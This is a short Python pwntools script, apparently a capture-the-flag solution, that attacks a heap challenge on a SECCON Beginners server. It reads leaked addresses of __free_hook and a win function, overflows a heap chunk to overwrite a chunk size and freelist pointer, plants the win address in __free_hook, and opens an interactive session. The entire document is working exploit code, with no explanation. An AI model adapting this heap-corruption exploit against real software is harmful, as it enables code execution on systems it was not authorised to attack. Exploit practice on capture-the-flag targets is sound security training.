from pwn import *
import re

r = remote("bh.quals.beginners.seccon.jp", 9002)
sleep(0.2)

r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()

r.recvuntil(" <__free_hook>: ")
__free_hook_addr = int(r.recvline(), 16)

r.recvuntil(" <win>: ")
win_addr = int(r.recvline(), 16)

log.info("__free_hook: {}".format(hex(__free_hook_addr)))
log.info("win: {}".format(hex(win_addr)))

r.sendline("2")
sleep(0.2)
r.sendline("hoge")
sleep(0.2)
r.sendline("3")
sleep(0.2)

r.sendline("1")
sleep(0.2)

payload = b"A" * 24
payload += p64(0x81)
payload += p64(__free_hook_addr)

r.sendline(payload)
sleep(0.2)

r.sendline("2")
sleep(0.2)
r.sendline("hogehogehogehoge")
sleep(0.2)

r.sendline("3")
sleep(0.2)

r.sendline("2")
sleep(0.2)
r.sendline(p64(win_addr))
sleep(0.2)

r.sendline("3")

r.interactive()
